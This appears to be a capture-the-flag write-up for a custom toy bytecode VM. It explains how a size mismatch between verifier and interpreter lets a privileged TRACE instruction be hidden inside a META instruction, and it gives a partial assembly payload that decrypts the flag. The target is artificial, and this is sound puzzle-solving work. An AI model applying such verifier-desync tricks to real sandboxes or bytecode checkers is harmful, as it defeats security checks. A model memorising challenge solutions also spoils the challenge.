koth/stage-6/glasshouse-kit/ contains glasshouse.py, assembler.py, runner.py, example.asm, README.md, and VM_SPEC.md. Stage 6 specifics:

  • OPCODE_MASK = 0x96 (assemble with --mask 0x96).
  • Arena is host + guest (HOST_BASE = 0, GUEST_BASE = 2048); beacon is at guest 0..7.
  • New TRACE dst, page, index (logical 0x27, gas 3) is marked privileged.
  • New META imm (logical 0x50, runtime gas 1, runtime size 2).
  • The verifier has a size table: META is listed as 6 bytes and any TRACE found at a verifier boundary is rejected.
  • Flag layout:
  • slot = ((b0*7 + b3*11 + b5) & 31) * 64 (0, 64, ..., 1984)
  • key0 = (b1 + b6 + 0x47) & 0xFF
  • host[slot:slot+3] = b"RV" + bytes([key0])
  • host[slot+3+(47-i)] = flag[i] ^ beacon[(7-i) & 7] ^ key_i
  • key_{i+1} = (key_i*3 + 0x29) & 0xFF

docs.title: VM analysis
docs.text:
The verifier walks the bytecode independently of execution:

verify_sizes = {
    ..., 0x20: 4, 0x27: 4, 0x30: 2, 0x40: 2, 0x41: 3,
    0x50: 6,
}
while verify_pc < len(code):
    verify_op = code[verify_pc] ^ OPCODE_MASK
    if verify_op == 0x27:
        raise VMError("privileged trace rejected by verifier")
    verify_size = verify_sizes.get(verify_op)
    ...
    verify_pc += verify_size

The interpreter, however, treats META as a two-byte no-op:

elif op == 0x50:  # META imm
    need(2)
    pc += 2
    gas += 1

Encoded layout META 0; TRACE dst,page,index is therefore six bytes on disk. The verifier sees one 6-byte META and resumes after the TRACE, while the interpreter sees META (2 bytes) followed by the real TRACE (4 bytes). A TRACE can also be a loop target: after the first iteration, JNZ can jump directly to the TRACE byte (inside the hidden region), skipping the META and saving one gas per iteration.

docs.title: Payload
docs.text:
The final active payload is koth/stage-6/u8.ghb (353 B, max gas 671), a byte-identical copy of the submitted file preserved as koth/stage-6/u8_submitted_353.ghb. It emits the constant prefix Layer7{ and suffix }, so only the 40 middle bytes need decryption. It reads key0 from the host header, advances the key seven steps (key7 = key0*139 + 13 mod 256), starts at host[slot+43], and uses an eight-byte unrolled loop with fixed beacon indices:

; q = (7*b0 + 11*b3 + b5) & 31
; page = q >> 2 ; idx = (q << 6) + 50
LOAD r4, r0, r0
MULI r4, 7
...
MOV r5, r4
SHR r5, 2
SHL r4, 6
ADDI r4, 2
META 0
TRACE r2, r5, r4      ; key0 = host[slot+2]
ADDI r4, 41
MULI r2, 139
ADDI r2, 13           ; key7
LDI r1, 5             ; five 8-byte cycles = 40 bytes
loop:
META 0
TRACE r6, r5, r4
LDI r3, 0
LOAD r7, r0, r3
XOR r6, r7
XOR r6, r2
OUT r6
MULI r2, 3
ADDI r2, 0x29
SUBI r4, 1
...                   ; eight fixed beacon indices per block
JNZ r1, loop
LDI r6, 0x7D
OUT r6

  • koth/stage-6/u8.ghb / koth/stage-6/u8_submitted_353.ghb (353 B, gas 671): constant prefix/suffix plus an eight-byte fixed-index unrolled middle loop; best at W=1.
